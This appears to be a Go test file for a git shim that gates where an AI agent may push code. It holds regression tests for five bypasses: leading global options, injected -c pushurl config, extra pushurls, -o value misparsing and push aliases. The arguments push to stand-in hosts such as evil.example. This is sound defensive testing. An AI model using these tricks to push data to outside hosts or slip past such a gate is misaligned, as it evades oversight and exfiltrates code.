package gitshim

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// testRepo creates a throwaway git repo with a single commit and an
// "origin" remote pointing at knownURL, then returns (repoDir, realGit).
func testRepo(t *testing.T, knownURL string) (repoDir, realGit string) {
	t.Helper()
	realGit, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not found on PATH; skipping integration test")
	}

	repoDir = t.TempDir()
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command(realGit, append([]string{"-C", repoDir}, args...)...)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		if err := cmd.Run(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out.String())
		}
	}

	run("init", "-q")
	run("config", "user.email", "t@example.com")
	run("config", "user.name", "t")
	if err := os.WriteFile(filepath.Join(repoDir, "README.md"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	run("add", "README.md")
	run("commit", "-q", "-m", "init")
	run("remote", "add", "origin", knownURL)

	return repoDir, realGit
}

// git runs the given argv against realGit -C repoDir and returns combined
// output, for asserting on config/remote state within a test.
func gitOutput(t *testing.T, realGit, repoDir string, args ...string) string {
	t.Helper()
	cmd := exec.Command(realGit, append([]string{"-C", repoDir}, args...)...)
	out, _ := cmd.CombinedOutput()
	return strings.TrimSpace(string(out))
}

const knownRemote = "https://github.com/known/repo.git"

// chdirT switches the test process's working directory to dir for the
// duration of the test and restores it afterward. resolveDestination's
// remote-name resolution shells out to `git remote get-url` without an
// explicit `-C`, relying on cwd — exactly like the real shim does, whose
// cwd is the agent's working directory (see cmd.Dir in cmd/leash/main.go).
func chdirT(t *testing.T, dir string) {
	t.Helper()
	orig, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(orig) })
}

// TestResolveInvocation_GlobalOptionBypass is a regression test for V1: a
// leading global option (-C, -c) must not stop the shim from recognizing
// that the invocation is ultimately `push`.
func TestResolveInvocation_GlobalOptionBypass(t *testing.T) {
	_, realGit := testRepo(t, knownRemote)

	cases := [][]string{
		{"-C", "/tmp", "push", "https://evil.example/x.git", "main"},
		{"-c", "foo.bar=baz", "push", "https://evil.example/x.git", "main"},
		{"-c", "a=1", "-c", "b=2", "push", "https://evil.example/x.git", "main"},
	}
	for _, args := range cases {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			isPush, pushArgs, _ := resolveInvocation(realGit, args)
			if !isPush {
				t.Fatalf("resolveInvocation(%v) isPush = false; want true (V1 regression)", args)
			}
			if len(pushArgs) == 0 || pushArgs[0] != "https://evil.example/x.git" {
				t.Fatalf("resolveInvocation(%v) pushArgs = %v; want destination as first element", args, pushArgs)
			}
		})
	}
}

// TestResolveInvocation_ConfigInjection is a regression test for V2: a
// `-c remote.origin.pushurl=...` on the command line must be visible to
// resolveDestination's remote resolution, not silently dropped.
func TestResolveInvocation_ConfigInjection(t *testing.T) {
	repoDir, realGit := testRepo(t, knownRemote)
	chdirT(t, repoDir)

	args := []string{"-c", "remote.origin.pushurl=https://evil.example/injected.git", "push", "origin", "main"}
	isPush, pushArgs, configArgs := resolveInvocation(realGit, args)
	if !isPush {
		t.Fatalf("resolveInvocation(%v) isPush = false; want true", args)
	}

	dests, err := resolveDestination(realGit, pushArgs, configArgs)
	if err != nil {
		t.Fatalf("resolveDestination: %v", err)
	}
	if len(dests) != 1 || dests[0] != "https://evil.example/injected.git" {
		t.Fatalf("resolveDestination with injected -c pushurl = %v; want the injected URL to be visible (V2 regression)", dests)
	}

	// Sanity: without the config override we should just get origin's
	// real, clean URL.
	cleanDests, err := resolveDestination(realGit, []string{"origin", "main"}, nil)
	if err != nil {
		t.Fatalf("resolveDestination (clean): %v", err)
	}
	if len(cleanDests) != 1 || cleanDests[0] != knownRemote {
		t.Fatalf("resolveDestination without -c = %v; want %v", cleanDests, []string{knownRemote})
	}
}

// TestResolveDestination_MultiplePushURLs is a regression test for V3: a
// remote with more than one pushurl must have *all* of them resolved, not
// just the first — real git pushes to every configured pushurl.
func TestResolveDestination_MultiplePushURLs(t *testing.T) {
	repoDir, realGit := testRepo(t, knownRemote)
	chdirT(t, repoDir)

	if out := gitOutput(t, realGit, repoDir, "remote", "set-url", "--push", "--add", "origin", knownRemote); out != "" {
		t.Fatalf("remote set-url --add (1st): %s", out)
	}
	secondURL := "https://github.com/attacker/secondary.git"
	if out := gitOutput(t, realGit, repoDir, "remote", "set-url", "--push", "--add", "origin", secondURL); out != "" {
		t.Fatalf("remote set-url --add (2nd): %s", out)
	}

	dests, err := resolveDestination(realGit, []string{"origin", "main"}, nil)
	if err != nil {
		t.Fatalf("resolveDestination: %v", err)
	}
	if len(dests) != 2 {
		t.Fatalf("resolveDestination with 2 pushurls = %v; want 2 destinations (V3 regression)", dests)
	}
	found := map[string]bool{}
	for _, d := range dests {
		found[d] = true
	}
	if !found[knownRemote] || !found[secondURL] {
		t.Fatalf("resolveDestination = %v; want both %q and %q", dests, knownRemote, secondURL)
	}
}

// TestResolveDestination_PushOptionWithValue is a regression test for V4:
// `-o <value>` (and friends) must not have their value token misread as
// the push destination.
func TestResolveDestination_PushOptionWithValue(t *testing.T) {
	repoDir, realGit := testRepo(t, knownRemote)
	chdirT(t, repoDir)

	t.Run("bypass via -o origin <evil>", func(t *testing.T) {
		// Before the V4 fix, this misread "origin" as the destination and
		// let the real evil URL slip through unaudited as an argument.
		pushArgs := []string{"-o", "origin", "https://evil.example/x.git", "main"}
		dests, err := resolveDestination(realGit, pushArgs, nil)
		if err != nil {
			t.Fatalf("resolveDestination: %v", err)
		}
		if len(dests) != 1 || dests[0] != "https://evil.example/x.git" {
			t.Fatalf("resolveDestination(%v) = %v; want the actual URL, not the -o value (V4 regression)", pushArgs, dests)
		}
	})

	t.Run("legitimate -o value not misread as destination", func(t *testing.T) {
		pushArgs := []string{"-o", "merge_request.create", "origin", "main"}
		dests, err := resolveDestination(realGit, pushArgs, nil)
		if err != nil {
			t.Fatalf("resolveDestination: %v", err)
		}
		if len(dests) != 1 || dests[0] != knownRemote {
			t.Fatalf("resolveDestination(%v) = %v; want origin's real URL, not a false block on the -o value", pushArgs, dests)
		}
	})
}

// TestResolveInvocation_AliasExpansion is a regression test for V5: a git
// alias that expands to `push` must still be gated.
func TestResolveInvocation_AliasExpansion(t *testing.T) {
	repoDir, realGit := testRepo(t, knownRemote)
	if out := gitOutput(t, realGit, repoDir, "config", "alias.p", "push"); out != "" {
		t.Fatalf("config alias.p: %s", out)
	}

	// resolveInvocation needs cwd context for `git config --get alias.p`
	// to find the repo-local alias.
	chdirT(t, repoDir)

	args := []string{"p", "https://evil.example/via-alias.git", "main"}
	isPush, pushArgs, _ := resolveInvocation(realGit, args)
	if !isPush {
		t.Fatalf("resolveInvocation(%v) isPush = false; want true (V5 regression, alias.p=push)", args)
	}
	if len(pushArgs) == 0 || pushArgs[0] != "https://evil.example/via-alias.git" {
		t.Fatalf("resolveInvocation(%v) pushArgs = %v; want destination as first element", args, pushArgs)
	}
}

// TestResolveInvocation_NonPushAliasPassesThrough confirms an alias that
// does NOT expand to push is left alone (not misclassified as push).
func TestResolveInvocation_NonPushAliasPassesThrough(t *testing.T) {
	repoDir, realGit := testRepo(t, knownRemote)
	if out := gitOutput(t, realGit, repoDir, "config", "alias.st", "status"); out != "" {
		t.Fatalf("config alias.st: %s", out)
	}

	chdirT(t, repoDir)

	isPush, _, _ := resolveInvocation(realGit, []string{"st"})
	if isPush {
		t.Fatalf("resolveInvocation([st]) isPush = true; want false (alias.st=status is not a push alias)")
	}
}

// TestResolveDestination_BarePushUnresolved confirms bare `git push` (no
// explicit remote/URL) is rejected rather than guessed at.
func TestResolveDestination_BarePushUnresolved(t *testing.T) {
	realGit, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not found on PATH")
	}
	if _, err := resolveDestination(realGit, nil, nil); err == nil {
		t.Fatal("resolveDestination(nil) = nil error; want an error for unresolved bare push")
	}
}
